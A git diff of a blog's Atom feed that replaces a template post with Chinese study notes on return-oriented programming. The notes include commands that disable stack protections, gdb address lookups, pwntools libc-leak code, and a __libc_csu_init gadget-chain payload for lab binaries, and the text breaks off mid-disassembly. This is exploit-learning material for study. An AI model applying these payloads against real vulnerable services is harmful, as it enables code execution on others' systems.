@@ -1,81 +1,196 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN"><id>/</id><title>yurisec</title><updated>2020-05-14T16:11:45.658346+08:06</updated><author><name>Yuri</name><email>yuripwn@gmail.com</email></author><link href="/" rel="alternate"/><generator uri="https://lkiesow.github.io/python-feedgen" version="0.9.0">python-feedgen</generator><logo>https://cdn.jsdelivr.net/gh/yuriufo/yurisec.github.io@gh-pages/logo.png</logo><subtitle>unknow</subtitle><entry><id>/archives/typography/</id><title>Hello World!</title><updated>2020-05-14T16:11:45.658402+00:00</updated><author><name>AlanDecode</name><email>yuripwn@gmail.com</email><uri>https://www.yurisec.cn</uri></author><content>&lt;div class="notice"&gt;这是一篇示例文章，在这里你可以看到常用页面元素的显示效果，同时也是 Markdown 语法的参考文章。保留或者删除本文，开始自己的创作吧！&lt;/div&gt;&lt;h2&gt;L2 Heading&lt;/h2&gt;
-&lt;h3&gt;L3 Heading&lt;/h3&gt;
-&lt;h4&gt;L4 Heading&lt;/h4&gt;
-&lt;h5&gt;L5 Heading&lt;/h5&gt;
-&lt;h6&gt;L6 Heading&lt;/h6&gt;
-&lt;h2&gt;Paragraph&lt;/h2&gt;
-&lt;p&gt;We are creating a world that all may enter without privilege or prejudice accorded by race, economic power, military force, or station of birth.&lt;/p&gt;
-&lt;p&gt;We are creating a world where anyone, anywhere may express his or her beliefs, no matter how singular, without fear of being coerced into silence or conformity.&lt;/p&gt;
-&lt;h2&gt;Inline elements&lt;/h2&gt;
-&lt;p&gt;&lt;strong&gt;Bold&lt;/strong&gt;, &lt;ruby&gt;Ruby&lt;rp&gt;(&lt;/rp&gt;&lt;rt&gt;ルビ&lt;/rt&gt;&lt;rp&gt;)&lt;/rp&gt;&lt;/ruby&gt;, &lt;em&gt;Italic&lt;/em&gt;, &lt;del&gt;Strikethrough&lt;/del&gt;, &lt;a href="https://www.imalan.cn"&gt;Link&lt;/a&gt;&lt;sup id="fn_ref_1"&gt;&lt;a href="#fn_1"&gt;1&lt;/a&gt;&lt;/sup&gt;。&lt;/p&gt;
-&lt;h2&gt;Blockquote and nested blockquote&lt;/h2&gt;
-&lt;blockquote&gt;&lt;p&gt;安得广厦千万间，大庇天下寒士俱欢颜！风雨不动安如山。&lt;/p&gt;
-&lt;blockquote&gt;&lt;p&gt;呜呼！何时眼前突兀见此屋，吾庐独破受冻死亦足！&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN"><id>/yuriufo-blog.github.io/</id><title>YuriSec</title><updated>2020-05-19T15:04:40.966668+08:06</updated><author><name>Yuri</name><email>yuripwn@gmail.com</email></author><link href="/yuriufo-blog.github.io/" rel="alternate"/><generator uri="https://lkiesow.github.io/python-feedgen" version="0.9.0">python-feedgen</generator><logo>https://cdn.jsdelivr.net/gh/yuriufo/yuriufo-blog.github.io@gh-pages/logo.png</logo><subtitle>A simple static blog.</subtitle><entry><id>/yuriufo-blog.github.io/archives/RopNote/</id><title>一步一步学ROP笔记</title><updated>2020-05-19T15:04:40.966723+00:00</updated><author><name>yuri</name><email>yuripwn@gmail.com</email><uri>https://yurisec.cn</uri></author><content>&lt;h1&gt;一步一步学ROP笔记&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;原文地址: &lt;a href="drops.wooyun.org/tips/6597"&gt;一步一步学ROP&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;/blockquote&gt;
-&lt;h2&gt;Code&lt;/h2&gt;
-&lt;p&gt;Inline code: &lt;code&gt;int a=1;&lt;/code&gt;. Code block:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
-    &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Hello World!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2&gt;List&lt;/h2&gt;
-&lt;h3&gt;Unordered List&lt;/h3&gt;
+&lt;h2&gt;x86&lt;/h2&gt;
+&lt;h3&gt;无保护&lt;/h3&gt;
 &lt;ul&gt;
-&lt;li&gt;iPhone&lt;ul&gt;
-&lt;li&gt;iPhone X&lt;/li&gt;
-&lt;li&gt;iPhone 11&lt;/li&gt;
+&lt;li&gt;关掉canary:  &lt;strong&gt;-fno-stack-protector&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;关掉NX:  &lt;strong&gt;-z execstack&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;关掉PIE:  &lt;strong&gt;sudo -s echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;iPad&lt;/li&gt;
-&lt;li&gt;MacBook&lt;/li&gt;
+&lt;h3&gt;绕过NX&lt;/h3&gt;
+&lt;p&gt;gdb下找&lt;code&gt;system()&lt;/code&gt;和&lt;code&gt;&amp;quot;/bin/sh\x00&amp;quot;&lt;/code&gt;的地址:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; print system
+&lt;span class="nv"&gt;$1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0xb7e5f460 &amp;lt;system&amp;gt;
+&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; print __libc_start_main
+&lt;span class="nv"&gt;$2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0xb7e393f0 &amp;lt;__libc_start_main&amp;gt;
+&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; find 0xb7e393f0, +2200000, &lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
+0xb7f81ff8
+&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; x/s 0xb7f81ff8
+0xb7f81ff8:  &lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;绕过NX和PIE&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;看plt : &lt;strong&gt;objdump -d -j .plt level2&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;看got : &lt;strong&gt;objdump -R level2&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;查看目标程序调用的so库 : &lt;strong&gt;ldd level2&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3&gt;Ordered List&lt;/h3&gt;
+&lt;p&gt;用pwntools:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;elf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;level2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;plt_write&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;got_write&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;got&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+
+&lt;span class="n"&gt;libc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;libc.so&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;system_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;write_addr&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;无libc.so&lt;/h3&gt;
+&lt;p&gt;步骤:&lt;/p&gt;
 &lt;ol&gt;
-&lt;li&gt;打开冰箱&lt;ol&gt;
-&lt;li&gt;右手放在冰箱门拉手上&lt;/li&gt;
-&lt;li&gt;左手扶住冰箱主体&lt;/li&gt;
-&lt;li&gt;右手向后用力&lt;/li&gt;
+&lt;li&gt;泄露&lt;code&gt;__libc_start_main&lt;/code&gt;地址&lt;/li&gt;
+&lt;li&gt;获取&lt;code&gt;libc&lt;/code&gt;版本&lt;/li&gt;
+&lt;li&gt;获取&lt;code&gt;system&lt;/code&gt;地址与&lt;code&gt;/bin/sh&lt;/code&gt;的地址&lt;/li&gt;
+&lt;li&gt;再次执行源程序&lt;/li&gt;
+&lt;li&gt;触发栈溢出执行&lt;code&gt;system(“/bin/sh”)&lt;/code&gt;&lt;/li&gt;
 &lt;/ol&gt;
+&lt;p&gt;DynELF的使用:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;leak&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;payload1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;140&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plt_write&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;vulfun_addr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%#x&lt;/span&gt;&lt;span class="s2"&gt; =&amp;gt; &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;
+
+&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DynELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./level2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="n"&gt;system_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lookup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;libc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;hr /&gt;
+&lt;h2&gt;x64&lt;/h2&gt;
+&lt;h3&gt;传参区别&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;前六个参数保存顺序 : &lt;strong&gt;RDI, RSI, RDX, RCX, R8, R9&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;gadgets&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;找ROP:  &lt;strong&gt;ROPgadget --binary level4 --only &amp;quot;pop|ret&amp;quot;&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;过滤:  &lt;strong&gt;ROPgadget --binary libc.so.6 --only &amp;quot;pop|ret&amp;quot; | grep rdi&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;通用gadgets part1&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;__libc_csu_init()&lt;/code&gt;下:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;.text:0000000000400840                 public __libc_csu_init
+.text:0000000000400840 __libc_csu_init proc near               &lt;span class="p"&gt;;&lt;/span&gt; DATA XREF: _start+16o
+.text:0000000000400840                 push    r15
+.text:0000000000400842                 mov     r15d, edi
+.text:0000000000400845                 push    r14
+.text:0000000000400847                 mov     r14, rsi
+.text:000000000040084A                 push    r13
+.text:000000000040084C                 mov     r13, rdx
+.text:000000000040084F                 push    r12
+.text:0000000000400851                 lea     r12, __frame_dummy_init_array_entry
+.text:0000000000400858                 push    rbp
+.text:0000000000400859                 lea     rbp, __do_global_dtors_aux_fini_array_entry
+.text:0000000000400860                 push    rbx
+.text:0000000000400861                 sub     rbp, r12
+.text:0000000000400864                 xor     ebx, ebx
+.text:0000000000400866                 sar     rbp, &lt;span class="m"&gt;3&lt;/span&gt;
+.text:000000000040086A                 sub     rsp, &lt;span class="m"&gt;8&lt;/span&gt;
+.text:000000000040086E                 call    _init_proc
+.text:0000000000400873                 &lt;span class="nb"&gt;test&lt;/span&gt;    rbp, rbp
+.text:0000000000400876                 jz      short loc_400896
+.text:0000000000400878                 nop     dword ptr &lt;span class="o"&gt;[&lt;/span&gt;rax+rax+00000000h&lt;span class="o"&gt;]&lt;/span&gt;
+.text:0000000000400880
+.text:0000000000400880 loc_400880:                             &lt;span class="p"&gt;;&lt;/span&gt; CODE XREF: __libc_csu_init+54j
+.text:0000000000400880                 mov     rdx, r13
+.text:0000000000400883                 mov     rsi, r14
+.text:0000000000400886                 mov     edi, r15d
+.text:0000000000400889                 call    qword ptr &lt;span class="o"&gt;[&lt;/span&gt;r12+rbx*8&lt;span class="o"&gt;]&lt;/span&gt;
+.text:000000000040088D                 add     rbx, &lt;span class="m"&gt;1&lt;/span&gt;
+.text:0000000000400891                 cmp     rbx, rbp
+.text:0000000000400894                 jnz     short loc_400880
+.text:0000000000400896
+.text:0000000000400896 loc_400896:                             &lt;span class="p"&gt;;&lt;/span&gt; CODE XREF: __libc_csu_init+36j
+.text:0000000000400896                 add     rsp, &lt;span class="m"&gt;8&lt;/span&gt;
+.text:000000000040089A                 pop     rbx
+.text:000000000040089B                 pop     rbp
+.text:000000000040089C                 pop     r12
+.text:000000000040089E                 pop     r13
+.text:00000000004008A0                 pop     r14
+.text:00000000004008A2                 pop     r15
+.text:00000000004008A4                 retn
+.text:00000000004008A4 __libc_csu_init endp
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;因此若要调用&lt;code&gt;write(1,got_write,8)&lt;/code&gt;, 则可这样构造:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# rbx必须为0,因为call qword ptr [r12+rbx*8]&lt;/span&gt;
+&lt;span class="c1"&gt;# rbp必须为1,0x40088D~0x400894有一个cmp,jnz&lt;/span&gt;
+&lt;span class="c1"&gt;# r12 = addr_got,因为call qword ptr [r12+rb1x*8]&lt;/span&gt;
+&lt;span class="c1"&gt;# r13 = rdx = arg3&lt;/span&gt;
+&lt;span class="c1"&gt;# r14 = rsi = arg2&lt;/span&gt;
+&lt;span class="c1"&gt;# r15 = edi = arg1&lt;/span&gt;
+&lt;span class="c1"&gt;# retn的padding需要7*8=56byte&lt;/span&gt;
+
+&lt;span class="c1"&gt;# padding&lt;/span&gt;
+&lt;span class="n"&gt;payload1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;136&lt;/span&gt; 
+&lt;span class="c1"&gt;# pop rbx地址_rbx=0_rbp=1_调用函数got_arg1_arg2_arg3&lt;/span&gt;
+&lt;span class="n"&gt;payload1&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x40089A&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;got_write&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;got_write&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
+&lt;span class="c1"&gt;# mov rdx,r13地址(注意看原始汇编)&lt;/span&gt;
+&lt;span class="n"&gt;payload1&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x400880&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
+&lt;span class="c1"&gt;# padding(7*8=56byte)&lt;/span&gt;
+&lt;span class="n"&gt;payload1&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;
+&lt;span class="c1"&gt;# ret&lt;/span&gt;
+&lt;span class="n"&gt;payload1&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;此外还有一个x64 gadgets, 就是:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;pop rdi&lt;/li&gt;
+&lt;li&gt;ret&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;的gadgets. 这个gadgets是由opcode错位产生的.&lt;/p&gt;
+&lt;p&gt;如上的例子中0x4008A2, 0x4008A4两处的字节码如下:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;0x41 0x5f 0xc3&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;意思是&lt;code&gt;pop r15, ret&lt;/code&gt;, 但是恰好&lt;code&gt;pop rdi, ret&lt;/code&gt;的opcode如下:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;0x5f 0xc3&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;因此如果我们指向0x4008A3就可以获得&lt;code&gt;pop rdi, ret&lt;/code&gt;的opcode, 从而对于单参数函数可以直接获得执行
+与此类似的, 还有0x4008A1处的 &lt;code&gt;pop rsi, pop r15, ret&lt;/code&gt;
+那么这个有什么用呢？我们知道x64传参顺序是&lt;strong&gt;rdi, rsi, rdx, rcx&lt;/strong&gt;.
+所以rsi是第二个参数, 我们可以在rop中配合&lt;code&gt;pop rdi,ret&lt;/code&gt;来使用&lt;code&gt;pop rsi, pop r15,ret&lt;/code&gt;, 这样就可以轻松的调用2个参数的函数.
+综上, 就是x64下利用通用gadgets调用一个参数, 两个参数, 三个参数函数的方法.&lt;/p&gt;
+&lt;h3&gt;通用gadgets part2&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;_dl_runtime_resolve()&lt;/code&gt;下&lt;strong&gt;(在内存中的地址是随机的)&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x7ffff7def200 &amp;lt;_dl_runtime_resolve&amp;gt;:       sub     rsp,0x38
+0x7ffff7def204 &amp;lt;_dl_runtime_resolve+4&amp;gt;:     mov     QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp&lt;span class="o"&gt;]&lt;/span&gt;,rax
+0x7ffff7def208 &amp;lt;_dl_runtime_resolve+8&amp;gt;:     mov     QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x8&lt;span class="o"&gt;]&lt;/span&gt;,rcx
+0x7ffff7def20d &amp;lt;_dl_runtime_resolve+13&amp;gt;:    mov     QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x10&lt;span class="o"&gt;]&lt;/span&gt;,rdx
+0x7ffff7def212 &amp;lt;_dl_runtime_resolve+18&amp;gt;:    mov     QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x18&lt;span class="o"&gt;]&lt;/span&gt;,rsi
+0x7ffff7def217 &amp;lt;_dl_runtime_resolve+23&amp;gt;:    mov     QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x20&lt;span class="o"&gt;]&lt;/span&gt;,rdi
+0x7ffff7def21c &amp;lt;_dl_runtime_resolve+28&amp;gt;:    mov     QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x28&lt;span class="o"&gt;]&lt;/span&gt;,r8
+0x7ffff7def221 &amp;lt;_dl_runtime_resolve+33&amp;gt;:    mov     QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x30&lt;span class="o"&gt;]&lt;/span&gt;,r9
+0x7ffff7def226 &amp;lt;_dl_runtime_resolve+38&amp;gt;:    mov     rsi,QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x40&lt;span class="o"&gt;]&lt;/span&gt;
+0x7ffff7def22b &amp;lt;_dl_runtime_resolve+43&amp;gt;:    mov     rdi,QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x38&lt;span class="o"&gt;]&lt;/span&gt;
+0x7ffff7def230 &amp;lt;_dl_runtime_resolve+48&amp;gt;:    call    0x7ffff7de8680 &amp;lt;_dl_fixup&amp;gt;
+0x7ffff7def235 &amp;lt;_dl_runtime_resolve+53&amp;gt;:    mov     r11,rax
+0x7ffff7def238 &amp;lt;_dl_runtime_resolve+56&amp;gt;:    mov     r9,QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x30&lt;span class="o"&gt;]&lt;/span&gt;
+0x7ffff7def23d &amp;lt;_dl_runtime_resolve+61&amp;gt;:    mov     r8,QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x28&lt;span class="o"&gt;]&lt;/span&gt;
+0x7ffff7def242 &amp;lt;_dl_runtime_resolve+66&amp;gt;:    mov     rdi,QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x20&lt;span class="o"&gt;]&lt;/span&gt;
+0x7ffff7def247 &amp;lt;_dl_runtime_resolve+71&amp;gt;:    mov     rsi,QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x18&lt;span class="o"&gt;]&lt;/span&gt;
+0x7ffff7def24c &amp;lt;_dl_runtime_resolve+76&amp;gt;:    mov     rdx,QWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;rsp+0x10&lt;span class="o"&gt;]&lt;/span&gt;
